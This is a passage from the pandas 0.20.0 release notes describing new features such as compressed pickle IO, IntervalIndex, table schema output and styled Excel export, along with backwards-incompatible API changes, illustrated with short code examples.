IO now supports compression\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:func:`read_pickle`, :meth:`DataFrame.to_pickle` and :meth:`Series.to_pickle`\ncan now read from and write to compressed pickle files. Compression methods\ncan be an explicit parameter or be inferred from the file extension.\nSee :ref:`the docs here. <io.pickle.compression>`\n\n.. ipython:: python\n\n   df = pd.DataFrame({'A': np.random.randn(1000),\n                      'B': 'foo',\n                      'C': pd.date_range('20130101', periods=1000, freq='s')})\n\nUsing an explicit compression type\n\n.. ipython:: python\n\n   df.to_pickle(\"data.pkl.compress\", compression=\"gzip\")\n   rt = pd.read_pickle(\"data.pkl.compress\", compression=\"gzip\")\n   rt.head()\n\nThe default is to infer the compression type from the extension (``compression='infer'``):\n\n.. ipython:: python\n\n   df.to_pickle(\"data.pkl.gz\")\n   rt = pd.read_pickle(\"data.pkl.gz\")\n   rt.head()\n   df[\"A\"].to_pickle(\"s1.pkl.bz2\")\n   rt = pd.read_pickle(\"s1.pkl.bz2\")\n   rt.head()\n\n.. ipython:: python\n   :suppress:\n\n   import os\n   os.remove(\"data.pkl.compress\")\n   os.remove(\"data.pkl.gz\")\n   os.remove(\"s1.pkl.bz2\")\n\n.. _whatsnew_0200.enhancements.uint64_support:\n\nUInt64 support improved\n^^^^^^^^^^^^^^^^^^^^^^^\n\npandas has significantly improved support for operations involving unsigned,\nor purely non-negative, integers. Previously, handling these integers would\nresult in improper rounding or data-type casting, leading to incorrect results.\nNotably, a new numerical index, ``UInt64Index``, has been created (:issue:`14937`)\n\n.. code-block:: ipython\n\n   In [1]: idx = pd.UInt64Index([1, 2, 3])\n   In [2]: df = pd.DataFrame({'A': ['a', 'b', 'c']}, index=idx)\n   In [3]: df.index\n   Out[3]: UInt64Index([1, 2, 3], dtype='uint64')\n\n- Bug in converting object elements of array-like objects to unsigned 64-bit integers (:issue:`4471`, :issue:`14982`)\n- Bug in ``Series.unique()`` in which unsigned 64-bit integers were causing overflow (:issue:`14721`)\n- Bug in ``DataFrame`` construction in which unsigned 64-bit integer elements were being converted to objects (:issue:`14881`)\n- Bug in ``pd.read_csv()`` in which unsigned 64-bit integer elements were being improperly converted to the wrong data types (:issue:`14983`)\n- Bug in ``pd.unique()`` in which unsigned 64-bit integers were causing overflow (:issue:`14915`)\n- Bug in ``pd.value_counts()`` in which unsigned 64-bit integers were being erroneously truncated in the output (:issue:`14934`)\n\n.. _whatsnew_0200.enhancements.groupy_categorical:\n\nGroupBy on categoricals\n^^^^^^^^^^^^^^^^^^^^^^^\n\nIn previous versions, ``.groupby(..., sort=False)`` would fail with a ``ValueError`` when grouping on a categorical series with some categories not appearing in the data. (:issue:`13179`)\n\n.. ipython:: python\n\n   chromosomes = np.r_[np.arange(1, 23).astype(str), ['X', 'Y']]\n   df = pd.DataFrame({\n       'A': np.random.randint(100),\n       'B': np.random.randint(100),\n       'C': np.random.randint(100),\n       'chromosomes': pd.Categorical(np.random.choice(chromosomes, 100),\n                                     categories=chromosomes,\n                                     ordered=True)})\n   df\n\n**Previous behavior**:\n\n.. code-block:: ipython\n\n   In [3]: df[df.chromosomes != '1'].groupby('chromosomes', observed=False, sort=False).sum()\n   ---------------------------------------------------------------------------\n   ValueError: items in new_categories are not the same as in old categories\n\n**New behavior**:\n\n.. ipython:: python\n\n   df[df.chromosomes != '1'].groupby('chromosomes', observed=False, sort=False).sum()\n\n.. _whatsnew_0200.enhancements.table_schema:\n\nTable schema output\n^^^^^^^^^^^^^^^^^^^\n\nThe new orient ``'table'`` for :meth:`DataFrame.to_json`\nwill generate a `Table Schema`_ compatible string representation of\nthe data.\n\n.. ipython:: python\n\n   df = pd.DataFrame(\n       {'A': [1, 2, 3],\n        'B': ['a', 'b', 'c'],\n        'C': pd.date_range('2016-01-01', freq='d', periods=3)},\n       index=pd.Index(range(3), name='idx'))\n   df\n   df.to_json(orient='table')\n\n\nSee :ref:`IO: Table Schema for more information <io.table_schema>`.\n\nAdditionally, the repr for ``DataFrame`` and ``Series`` can now publish\nthis JSON Table schema representation of the Series or DataFrame if you are\nusing IPython (or another frontend like `nteract`_ using the Jupyter messaging\nprotocol).\nThis gives frontends like the Jupyter notebook and `nteract`_\nmore flexibility in how they display pandas objects, since they have\nmore information about the data.\nYou must enable this by setting the ``display.html.table_schema`` option to ``True``.\n\n.. _Table Schema: http://specs.frictionlessdata.io/json-table-schema/\n.. _nteract: https://nteract.io/\n\n.. _whatsnew_0200.enhancements.scipy_sparse:\n\nSciPy sparse matrix from/to SparseDataFrame\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\npandas now supports creating sparse dataframes directly from ``scipy.sparse.spmatrix`` instances.\nSee the :ref:`documentation <sparse.scipysparse>` for more information. (:issue:`4343`)\n\nAll sparse formats are supported, but matrices that are not in :mod:`COOrdinate <scipy.sparse>` format will be converted, copying data as needed.\n\n.. code-block:: python\n\n   from scipy.sparse import csr_matrix\n   arr = np.random.random(size=(1000, 5))\n   arr[arr < .9] = 0\n   sp_arr = csr_matrix(arr)\n   sp_arr\n   sdf = pd.SparseDataFrame(sp_arr)\n   sdf\n\nTo convert a ``SparseDataFrame`` back to sparse SciPy matrix in COO format, you can use:\n\n.. code-block:: python\n\n   sdf.to_coo()\n\n.. _whatsnew_0200.enhancements.style_excel:\n\nExcel output for styled DataFrames\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nExperimental support has been added to export ``DataFrame.style`` formats to Excel using the ``openpyxl`` engine. (:issue:`15530`)\n\nFor example, after running the following, ``styled.xlsx`` renders as below:\n\n.. ipython:: python\n   :okwarning:\n\n   np.random.seed(24)\n   df = pd.DataFrame({'A': np.linspace(1, 10, 10)})\n   df = pd.concat([df, pd.DataFrame(np.random.RandomState(24).randn(10, 4),\n                                    columns=list('BCDE'))],\n                  axis=1)\n   df.iloc[0, 2] = np.nan\n   df\n   styled = (df.style\n             .applymap(lambda val: 'color:red;' if val < 0 else 'color:black;')\n             .highlight_max())\n   styled.to_excel('styled.xlsx', engine='openpyxl')\n\n.. image:: ../_static/style-excel.png\n\n.. ipython:: python\n   :suppress:\n\n   import os\n   os.remove('styled.xlsx')\n\nSee the :ref:`Style documentation </user_guide/style.ipynbExport-to-Excel>` for more detail.\n\n.. _whatsnew_0200.enhancements.intervalindex:\n\nIntervalIndex\n^^^^^^^^^^^^^\n\npandas has gained an ``IntervalIndex`` with its own dtype, ``interval`` as well as the ``Interval`` scalar type. These allow first-class support for interval\nnotation, specifically as a return type for the categories in :func:`cut` and :func:`qcut`. The ``IntervalIndex`` allows some unique indexing, see the\n:ref:`docs <advanced.intervalindex>`. (:issue:`7640`, :issue:`8625`)\n\n.. warning::\n\n   These indexing behaviors of the IntervalIndex are provisional and may change in a future version of pandas. Feedback on usage is welcome.\n\n\nPrevious behavior:\n\nThe returned categories were strings, representing Intervals\n\n.. code-block:: ipython\n\n   In [1]: c = pd.cut(range(4), bins=2)\n\n   In [2]: c\n   Out[2]:\n   [(-0.003, 1.5], (-0.003, 1.5], (1.5, 3], (1.5, 3]]\n   Categories (2, object): [(-0.003, 1.5] < (1.5, 3]]\n\n   In [3]: c.categories\n   Out[3]: Index(['(-0.003, 1.5]', '(1.5, 3]'], dtype='object')\n\nNew behavior:\n\n.. ipython:: python\n\n   c = pd.cut(range(4), bins=2)\n   c\n   c.categories\n\nFurthermore, this allows one to bin *other* data with these same bins, with ``NaN`` representing a missing\nvalue similar to other dtypes.\n\n.. ipython:: python\n\n   pd.cut([0, 3, 5, 1], bins=c.categories)\n\nAn ``IntervalIndex`` can also be used in ``Series`` and ``DataFrame`` as the index.\n\n.. ipython:: python\n\n   df = pd.DataFrame({'A': range(4),\n                      'B': pd.cut([0, 3, 1, 1], bins=c.categories)\n                      }).set_index('B')\n   df\n\nSelecting via a specific interval:\n\n.. ipython:: python\n\n   df.loc[pd.Interval(1.5, 3.0)]\n\nSelecting via a scalar value that is contained *in* the intervals.\n\n.. ipython:: python\n\n   df.loc[0]\n\n.. _whatsnew_0200.enhancements.other:\n\nOther enhancements\n^^^^^^^^^^^^^^^^^^\n\n- ``DataFrame.rolling()`` now accepts the parameter ``closed='right'|'left'|'both'|'neither'`` to choose the rolling window-endpoint closedness. See the :ref:`documentation <window.endpoints>` (:issue:`13965`)\n- Integration with the ``feather-format``, including a new top-level ``pd.read_feather()`` and ``DataFrame.to_feather()`` method, see :ref:`here <io.feather>`.\n- ``Series.str.replace()`` now accepts a callable, as replacement, which is passed to ``re.sub`` (:issue:`15055`)\n- ``Series.str.replace()`` now accepts a compiled regular expression as a pattern (:issue:`15446`)\n- ``Series.sort_index`` accepts parameters ``kind`` and ``na_position`` (:issue:`13589`, :issue:`14444`)\n- ``DataFrame`` and ``DataFrame.groupby()``  have gained a ``nunique()`` method to count the distinct values over an axis (:issue:`14336`, :issue:`15197`).\n- ``DataFrame`` has gained a ``melt()`` method, equivalent to ``pd.melt()``, for unpivoting from a wide to long format (:issue:`12640`).\n- ``pd.read_excel()`` now preserves sheet order when using ``sheetname=None`` (:issue:`9930`)\n- Multiple offset aliases with decimal points are now supported (e.g. ``0.5min`` is parsed as ``30s``) (:issue:`8419`)\n- ``.isnull()`` and ``.notnull()`` have been added to ``Index`` object to make them more consistent with the ``Series`` API (:issue:`15300`)\n- New ``UnsortedIndexError`` (subclass of ``KeyError``) raised when indexing/slicing into an\n  unsorted MultiIndex (:issue:`11897`). This allows differentiation between errors due to lack\n  of sorting or an incorrect key. See :ref:`here <advanced.unsorted>`\n- ``MultiIndex`` has gained a ``.to_frame()`` method to convert to a ``DataFrame`` (:issue:`12397`)\n- ``pd.cut`` and ``pd.qcut`` now support datetime64 and timedelta64 dtypes (:issue:`14714`, :issue:`14798`)\n- ``pd.qcut`` has gained the ``duplicates='raise'|'drop'`` option to control whether to raise on duplicated edges (:issue:`7751`)\n- ``Series`` provides a ``to_excel`` method to output Excel files (:issue:`8825`)\n- The ``usecols`` argument in ``pd.read_csv()`` now accepts a callable function as a value  (:issue:`14154`)\n- The ``skiprows`` argument in ``pd.read_csv()`` now accepts a callable function as a value  (:issue:`10882`)\n- The ``nrows`` and ``chunksize`` arguments in ``pd.read_csv()`` are supported if both are passed (:issue:`6774`, :issue:`15755`)\n- ``DataFrame.plot`` now prints a title above each subplot if ``suplots=True`` and ``title`` is a list of strings (:issue:`14753`)\n- ``DataFrame.plot`` can pass the matplotlib 2.0 default color cycle as a single string as color parameter, see `here <http://matplotlib.org/2.0.0/users/colors.html#cn-color-selection>`__. (:issue:`15516`)\n- ``Series.interpolate()`` now supports timedelta as an index type with ``method='time'`` (:issue:`6424`)\n- Addition of a ``level`` keyword to ``DataFrame/Series.rename`` to rename\n  labels in the specified level of a MultiIndex (:issue:`4160`).\n- ``DataFrame.reset_index()`` will now interpret a tuple ``index.name`` as a key spanning across levels of ``columns``, if this is a ``MultiIndex`` (:issue:`16164`)\n- ``Timedelta.isoformat`` method added for formatting Timedeltas as an `ISO 8601 duration`_. See the :ref:`Timedelta docs <timedeltas.isoformat>` (:issue:`15136`)\n- ``.select_dtypes()`` now allows the string ``datetimetz`` to generically select datetimes with tz (:issue:`14910`)\n- The ``.to_latex()`` method will now accept ``multicolumn`` and ``multirow`` arguments to use the accompanying LaTeX enhancements\n- ``pd.merge_asof()`` gained the option ``direction='backward'|'forward'|'nearest'`` (:issue:`14887`)\n- ``Series/DataFrame.asfreq()`` have gained a ``fill_value`` parameter, to fill missing values (:issue:`3715`).\n- ``Series/DataFrame.resample.asfreq`` have gained a ``fill_value`` parameter, to fill missing values during resampling (:issue:`3715`).\n- :func:`pandas.util.hash_pandas_object` has gained the ability to hash a ``MultiIndex`` (:issue:`15224`)\n- ``Series/DataFrame.squeeze()`` have gained the ``axis`` parameter. (:issue:`15339`)\n- ``DataFrame.to_excel()`` has a new ``freeze_panes`` parameter to turn on Freeze Panes when exporting to Excel (:issue:`15160`)\n- ``pd.read_html()`` will parse multiple header rows, creating a MultiIndex header. (:issue:`13434`).\n- HTML table output skips ``colspan`` or ``rowspan`` attribute if equal to 1. (:issue:`15403`)\n- :class:`pandas.io.formats.style.Styler` template now has blocks for easier extension, see the :ref:`example notebook </user_guide/style.ipynbSubclassing>` (:issue:`15649`)\n- :meth:`Styler.render() <pandas.io.formats.style.Styler.render>` now accepts ``**kwargs`` to allow user-defined variables in the template (:issue:`15649`)\n- Compatibility with Jupyter notebook 5.0; MultiIndex column labels are left-aligned and MultiIndex row-labels are top-aligned (:issue:`15379`)\n- ``TimedeltaIndex`` now has a custom date-tick formatter specifically designed for nanosecond level precision (:issue:`8711`)\n- ``pd.api.types.union_categoricals`` gained the ``ignore_ordered`` argument to allow ignoring the ordered attribute of unioned categoricals (:issue:`13410`). See the :ref:`categorical union docs <categorical.union>` for more information.\n- ``DataFrame.to_latex()`` and ``DataFrame.to_string()`` now allow optional header aliases. (:issue:`15536`)\n- Re-enable the ``parse_dates`` keyword of ``pd.read_excel()`` to parse string columns as dates (:issue:`14326`)\n- Added ``.empty`` property to subclasses of ``Index``. (:issue:`15270`)\n- Enabled floor division for ``Timedelta`` and ``TimedeltaIndex`` (:issue:`15828`)\n- ``pandas.io.json.json_normalize()`` gained the option ``errors='ignore'|'raise'``; the default is ``errors='raise'`` which is backward compatible. (:issue:`14583`)\n- ``pandas.io.json.json_normalize()`` with an empty ``list`` will return an empty ``DataFrame`` (:issue:`15534`)\n- ``pandas.io.json.json_normalize()`` has gained a ``sep`` option that accepts ``str`` to separate joined fields; the default is \".\", which is backward compatible. (:issue:`14883`)\n- :meth:`MultiIndex.remove_unused_levels` has been added to facilitate :ref:`removing unused levels <advanced.shown_levels>`. (:issue:`15694`)\n- ``pd.read_csv()`` will now raise a ``ParserError`` error whenever any parsing error occurs (:issue:`15913`, :issue:`15925`)\n- ``pd.read_csv()`` now supports the ``error_bad_lines`` and ``warn_bad_lines`` arguments for the Python parser (:issue:`15925`)\n- The ``display.show_dimensions`` option can now also be used to specify\n  whether the length of a ``Series`` should be shown in its repr (:issue:`7117`).\n- ``parallel_coordinates()`` has gained a ``sort_labels`` keyword argument that sorts class labels and the colors assigned to them (:issue:`15908`)\n- Options added to allow one to turn on/off using ``bottleneck`` and ``numexpr``, see :ref:`here <basics.accelerate>` (:issue:`16157`)\n- ``DataFrame.style.bar()`` now accepts two more options to further customize the bar chart. Bar alignment is set with ``align='left'|'mid'|'zero'``, the default is \"left\", which is backward compatible; You can now pass a list of ``color=[color_negative, color_positive]``. (:issue:`14757`)\n\n.. _ISO 8601 duration: https://en.wikipedia.org/wiki/ISO_8601#Durations\n\n\n.. _whatsnew_0200.api_breaking:\n\nBackwards incompatible API changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n.. _whatsnew.api_breaking.io_compat:\n\nPossible incompatibility for HDF5 formats created with pandas < 0.13.0\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n``pd.TimeSeries`` was deprecated officially in 0.17.0, though has already been an alias since 0.13.0. It has\nbeen dropped in favor of ``pd.Series``. (:issue:`15098`).\n\nThis *may* cause HDF5 files that were created in prior versions to become unreadable if ``pd.TimeSeries``\nwas used. This is most likely to be for pandas < 0.13.0. If you find yourself in this situation.\nYou can use a recent prior version of pandas to read in your HDF5 files,\nthen write them out again after applying the procedure below.\n\n.. code-block:: ipython\n\n   In [2]: s = pd.TimeSeries([1, 2, 3], index=pd.date_range('20130101', periods=3))\n\n   In [3]: s\n   Out[3]:\n   2013-01-01    1\n   2013-01-02    2\n   2013-01-03    3\n   Freq: D, dtype: int64\n\n   In [4]: type(s)\n   Out[4]: pandas.core.series.TimeSeries\n\n   In [5]: s = pd.Series(s)\n\n   In [6]: s\n   Out[6]:\n   2013-01-01    1\n   2013-01-02    2\n   2013-01-03    3\n   Freq: D, dtype: int64\n\n   In [7]: type(s)\n   Out[7]: pandas.core.series.Series\n\n\n.. _whatsnew_0200.api_breaking.index_map:\n\nMap on Index types now return other Index types\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n``map`` on an ``Index`` now returns an ``Index``, not a numpy array (:issue:`12766`)\n\n.. ipython:: python\n\n   idx = pd.Index([1, 2])\n   idx\n   mi = pd.MultiIndex.from_tuples([(1, 2), (2, 4)])\n   mi\n\nPrevious behavior:\n\n.. code-block:: ipython\n\n   In [5]: idx.map(lambda x: x * 2)\n   Out[5]: array([2, 4])\n\n   In [6]: idx.map(lambda x: (x, x * 2))\n   Out[6]: array([(1, 2), (2, 4)], dtype=object)\n\n   In [7]: mi.map(lambda x: x)\n   Out[7]: array([(1, 2), (2, 4)], dtype=object)\n\n   In [8]: mi.map(lambda x: x[0])\n   Out[8]: array([1, 2])\n\nNew behavior:\n\n.. ipython:: python\n\n   idx.map(lambda x: x * 2)\n   idx.map(lambda x: (x, x * 2))\n\n   mi.map(lambda x: x)\n\n   mi.map(lambda x: x[0])\n\n\n``map`` on a ``Series`` with ``datetime64`` values may return ``int64`` dtypes rather than ``int32``\n\n.. code-block:: ipython\n\n   In [64]: s = pd.Series(pd.date_range('2011-01-02T00:00', '2011-01-02T02:00', freq='H')\n      ....:               .tz_localize('Asia/Tokyo'))\n      ....:\n\n   In [65]: s\n   Out[65]:\n   0   2011-01-02 00:00:00+09:00\n   1   2011-01-02 01:00:00+09:00\n   2   2011-01-02 02:00:00+09:00\n   Length: 3, dtype: datetime64[ns, Asia/Tokyo]\n\nPrevious behavior:\n\n.. code-block:: ipython\n\n   In [9]: s.map(lambda x: x.hour)\n   Out[9]:\n   0    0\n   1    1\n   2    2\n   dtype: int32\n\nNew behavior:\n\n.. code-block:: ipython\n\n   In [66]: s.map(lambda x: x.hour)\n   Out[66]:\n   0    0\n   1    1\n   2    2\n   Length: 3, dtype: int64\n\n\n.. _whatsnew_0200.api_breaking.index_dt_field:\n\nAccessing datetime fields of Index now return Index\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe datetime-related attributes (see :ref:`here <timeseries.components>`\nfor an overview) of ``DatetimeIndex``, ``PeriodIndex`` and ``TimedeltaIndex`` previously\nreturned numpy arrays. They will now return a new ``Index`` object, except\nin the case of a boolean field, where the result will still be a boolean ndarray. (:issue:`15022`)\n\nPrevious behaviour:\n\n.. code-block:: ipython\n\n   In [1]: idx = pd.date_range(\"2015-01-01\", periods=5, freq='10H')\n\n   In [2]: idx.hour\n   Out[2]: array([ 0, 10, 20,  6, 16], dtype=int32)\n\nNew behavior:\n\n.. code-block:: ipython\n\n   In [67]: idx = pd.date_range(\"2015-01-01\", periods=5, freq='10H')\n\n   In [68]: idx.hour\n   Out[68]: Index([0, 10, 20, 6, 16], dtype='int32')\n\nThis has the advantage that specific ``Index`` methods are still available on the\nresult. On the other hand, this might have backward incompatibilities: e.g.\ncompared to numpy arrays, ``Index`` objects are not mutable. To get the original\nndarray, you can always convert explicitly using ``np.asarray(idx.hour)``.\n\n.. _whatsnew_0200.api_breaking.unique:\n\npd.unique will now be consistent with extension types\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nIn prior versions, using :meth:`Series.unique` and :func:`pandas.unique` on ``Categorical`` and tz-aware\ndata-types would yield different return types. These are now made consistent. (:issue:`15903`)\n\n- Datetime tz-aware\n\n  Previous behaviour:\n\n  .. code-block:: ipython\n\n      Series\n     In [5]: pd.Series([pd.Timestamp('20160101', tz='US/Eastern'),\n        ...:            pd.Timestamp('20160101', tz='US/Eastern')]).unique()\n     Out[5]: array([Timestamp('2016-01-01 00:00:00-0500', tz='US/Eastern')], dtype=object)\n\n     In [6]: pd.unique(pd.Series([pd.Timestamp('20160101', tz='US/Eastern'),\n        ...:                      pd.Timestamp('20160101', tz='US/Eastern')]))\n     Out[6]: array(['2016-01-01T05:00:00.000000000'], dtype='datetime64[ns]')\n\n      Index\n     In [7]: pd.Index([pd.Timestamp('20160101', tz='US/Eastern'),\n        ...:           pd.Timestamp('20160101', tz='US/Eastern')]).unique()\n     Out[7]: DatetimeIndex(['2016-01-01 00:00:00-05:00'], dtype='datetime64[ns, US/Eastern]', freq=None)\n\n     In [8]: pd.unique([pd.Timestamp('20160101', tz='US/Eastern'),\n        ...:            pd.Timestamp('20160101', tz='US/Eastern')])\n     Out[8]: array(['2016-01-01T05:00:00.000000000'], dtype='datetime64[ns]')\n\n  New behavior:\n\n  .. ipython:: python\n\n      Series, returns an array of Timestamp tz-aware\n     pd.Series([pd.Timestamp(r'20160101', tz=r'US/Eastern'),\n                pd.Timestamp(r'20160101', tz=r'US/Eastern')]).unique()\n     pd.unique(pd.Series([pd.Timestamp('20160101', tz='US/Eastern'),\n               pd.Timestamp('20160101', tz='US/Eastern')]))\n\n      Index, returns a DatetimeIndex\n     pd.Index([pd.Timestamp('20160101', tz='US/Eastern'),\n               pd.Timestamp('20160101', tz='US/Eastern')]).unique()\n     pd.unique(pd.Index([pd.Timestamp('20160101', tz='US/Eastern'),\n                         pd.Timestamp('20160101', tz='US/Eastern')]))\n\n- Categoricals\n\n  Previous behaviour:\n\n  .. code-block:: ipython\n\n     In [1]: pd.Series(list('baabc'), dtype='category').unique()\n     Out[1]:\n     [b, a, c]\n     Categories (3, object): [b, a, c]\n\n     In [2]: pd.unique(pd.Series(list('baabc'), dtype='category'))\n     Out[2]: array(['b', 'a', 'c'], dtype=object)\n\n  New behavior:\n\n  .. ipython:: python\n\n      returns a Categorical\n     pd.Series(list('baabc'), dtype='category').unique()\n     pd.unique(pd.Series(list('baabc'), dtype='category'))\n\n.. _whatsnew_0200.api_breaking.s3:\n\nS3 file handling\n^^^^^^^^^^^^^^^^\n\npandas now uses `s3fs <http://s3fs.readthedocs.io/>`_ for handling S3 connections. This shouldn't break\nany code. However, since ``s3fs`` is not a required dependency, you will need to install it separately, like ``boto``\nin prior versions of pandas. (:issue:`11915`).\n\n.. _whatsnew_0200.api_breaking.partial_string_indexing:\n\nPartial string indexing changes\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:ref:`DatetimeIndex Partial String Indexing <timeseries.partialindexing>` now works as an exact match, provided that string resolution coincides with index resolution, including a case when both are seconds (:issue:`14826`). See :ref:`Slice vs. Exact Match <timeseries.slice_vs_exact_match>` for details.\n\n.. ipython:: python\n\n   df = pd.DataFrame({'a': [1, 2, 3]}, pd.DatetimeIndex(['2011-12-31 23:59:59',\n                                                         '2012-01-01 00:00:00',\n                                                         '2012-01-01 00:00:01']))\nPrevious behavior:\n\n.. code-block:: ipython\n\n   In [4]: df['2011-12-31 23:59:59']\n   Out[4]:\n                          a\n   2011-12-31 23:59:59  1\n\n   In [5]: df['a']['2011-12-31 23:59:59']\n   Out[5]:\n   2011-12-31 23:59:59    1\n   Name: a, dtype: int64\n\n\nNew behavior:\n\n.. code-block:: ipython\n\n   In [4]: df['2011-12-31 23:59:59']\n   KeyError: '2011-12-31 23:59:59'\n\n   In [5]: df['a']['2011-12-31 23:59:59']\n   Out[5]: 1\n\n.. _whatsnew_0200.api_breaking.concat_dtypes:\n\nConcat of different float dtypes will not automatically upcast\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nPreviously, ``concat`` of multiple objects with different ``float`` dtypes would automatically upcast results to a dtype of ``float64``.\nNow the smallest acceptable dtype will be used (:issue:`13247`)\n\n.. ipython:: python\n\n   df1 = pd.DataFrame(np.array([1.0], dtype=np.float32, ndmin=2))\n   df1.dtypes\n\n   df2 = pd.DataFrame(np.array([np.nan], dtype=np.float32, ndmin=2))\n   df2.dtypes\n\nPrevious behavior:\n\n.. code-block:: ipython\n\n   In [7]: pd.concat([df1, df2]).dtypes\n   Out[7]:\n   0    float64\n   dtype: object\n\nNew behavior:\n\n.. ipython:: python\n\n   pd.concat([df1, df2]).dtypes\n\n.. _whatsnew_0200.api_breaking.gbq:\n\npandas Google BigQuery support has moved\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\npandas has split off Google BigQuery support into a separate package ``pandas-gbq``. You can ``conda install pandas-gbq -c conda-forge`` or\n``pip install pandas-gbq`` to get it. The functionality of :func:`read_gbq` and :meth:`DataFrame.to_gbq` remain the same with the\ncurrently released version of ``pandas-gbq=0.1.4``. Documentation is now hosted `here <https://pandas-gbq.readthedocs.io/>`__  (:issue:`15347`)\n\n.. _whatsnew_0200.api_breaking.memory_usage:\n\nMemory usage for Index is more accurate\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nIn previous versions, showing ``.memory_usage()`` on a pandas structure that has an index, would only include actual index values and not include structures that facilitated fast indexing. This will generally be different for ``Index`` and ``MultiIndex`` and less-so for other index types. (:issue:`15237`)\n\nPrevious behavior:\n\n.. code-block:: ipython\n\n   In [8]: index = pd.Index(['foo', 'bar', 'baz'])\n\n   In [9]: index.memory_usage(deep=True)\n   Out[9]: 180\n\n   In [10]: index.get_loc('foo')\n   Out[10]: 0\n\n   In [11]: index.memory_usage(deep=True)\n   Out[11]: 180\n\nNew behavior:\n\n.. code-block:: ipython\n\n   In [8]: index = pd.Index(['foo', 'bar', 'baz'])\n\n   In [9]: index.memory_usage(deep=True)\n   Out[9]: 180\n\n   In [10]: index.get_loc('foo')\n   Out[10]: 0\n\n   In [11]: index.memory_usage(deep=True)\n   Out[11]: 260\n\n.. _whatsnew_0200.api_breaking.sort_index:\n\nDataFrame.sort_index changes\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nIn certain cases, calling ``.sort_index()`` on a MultiIndexed DataFrame would return the *same* DataFrame without seeming to sort.\nThis would happen with a ``lexsorted``, but non-monotonic levels. (:issue:`15622`, :issue:`15687`, :issue:`14015`, :issue:`13431`, :issue:`15797`)\n\nThis is *unchanged* from prior versions, but shown for illustration purposes:\n\n.. code-block:: python\n\n   In [81]: df = pd.DataFrame(np.arange(6), columns=['value'],\n      ....:                   index=pd.MultiIndex.from_product([list('BA'), range(3)]))\n      ....:\n   In [82]: df\n\n   Out[82]:\n        value\n   B 0      0\n     1      1\n     2      2\n   A 0      3\n     1      4\n     2      5\n\n   [6 rows x 1 columns]\n\n.. code-block:: python\n\n   In [87]: df.index.is_lexsorted()\n   Out[87]: False\n\n   In [88]: df.index.is_monotonic\n   Out[88]: False\n\nSorting works as expected\n\n.. ipython:: python\n\n   df.sort_index()\n\n.. code-block:: python\n\n   In [90]: df.sort_index().index.is_lexsorted()\n   Out[90]: True\n\n   In [91]: df.sort_index().index.is_monotonic\n   Out[91]: True\n\nHowever, this example, which has a non-monotonic 2nd level,\ndoesn't behave as desired.\n\n.. ipython:: python\n\n   df = pd.DataFrame({'value': [1, 2, 3, 4]},\n                     index=pd.MultiIndex([['a', 'b'], ['bb', 'aa']],\n                                         [[0, 0, 1, 1], [0, 1, 0, 1]]))\n   df\n\nPrevious behavior:\n\n.. code-block:: python\n\n   In [11]: df.sort_index()\n   Out[11]:\n         value\n   a bb      1\n     aa      2\n   b bb      3\n     aa      4\n\n   In [14]: df.sort_index().index.is_lexsorted()\n   Out[14]: True\n\n   In [15]: df.sort_index().index.is_monotonic\n   Out[15]: False\n\nNew behavior:\n\n.. code-block:: python\n\n   In [94]: df.sort_index()\n   Out[94]:\n         value\n   a aa      2\n     bb      1\n   b aa      4\n     bb      3\n\n   [4 rows x 1 columns]\n\n   In [95]: df.sort_index().index.is_lexsorted()\n   Out[95]: True\n\n   In [96]: df.sort_index().index.is_monotonic\n   Out[96]: True\n\n\n.. _whatsnew_0200.api_breaking.groupby_describe:\n\nGroupBy describe formatting\n^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe output formatting of ``groupby.describe()`` now labels the ``describe()`` metrics in the columns instead of the index.\nThis format is consistent with ``groupby.agg()`` when applying multiple functions at once. (:issue:`4792`)\n\nPrevious behavior:\n\n.. code-block:: ipython\n\n   In [1]: df = pd.DataFrame({'A': [1, 1, 2, 2], 'B': [1, 2, 3, 4]})\n\n   In [2]: df.groupby('A').describe()\n   Out[2]:\n                   B\n   A\n   1 count  2.000000\n     mean   1.500000\n     std    0.707107\n     min    1.000000\n     25%    1.250000\n     50%    1.500000\n     75%    1.750000\n     max    2.000000\n   2 count  2.000000\n     mean   3.500000\n     std    0.707107\n     min    3.000000\n     25%    3.250000\n     50%    3.500000\n     75%    3.750000\n     max    4.000000\n\n   In [3]: df.groupby('A').agg([\"mean\", \"std\", \"min\", \"max\"])\n   Out[3]:\n        B\n     mean       std amin amax\n   A\n   1  1.5  0.707107    1    2\n   2  3.5  0.707107    3    4\n\nNew behavior:\n\n.. ipython:: python\n\n   df = pd.DataFrame({'A': [1, 1, 2, 2], 'B': [1, 2, 3, 4]})\n\n   df.groupby('A').describe()\n\n   df.groupby('A').agg([\"mean\", \"std\", \"min\", \"max\"])\n\n.. _whatsnew_0200.api_breaking.rolling_pairwise:\n\nWindow binary corr/cov operations return a MultiIndex DataFrame\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nA binary window operation, like ``.corr()`` or ``.cov()``, when operating on a ``.rolling(..)``, ``.expanding(..)``, or ``.ewm(..)`` object,\nwill now return a 2-level ``MultiIndexed DataFrame`` rather than a ``Panel``, as ``Panel`` is now deprecated,\nsee :ref:`here <whatsnew_0200.api_breaking.deprecate_panel>`. These are equivalent in function,\nbut a MultiIndexed ``DataFrame`` enjoys more support in pandas.\nSee the section on :ref:`Windowed Binary Operations <window.cov_corr>` for more information. 